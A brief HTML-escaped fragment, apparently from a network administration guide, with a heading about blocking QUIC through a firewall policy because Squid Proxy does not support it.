 &lt;hr&gt;
 &lt;h1 id=&#34;block-quic-using-the-firewall-policy&#34;&gt;Block QUIC using the firewall policy.&lt;/h1&gt;
 &lt;p&gt;Squid Proxy does not support QUIC, so we have to disable it.&lt;/p&gt;
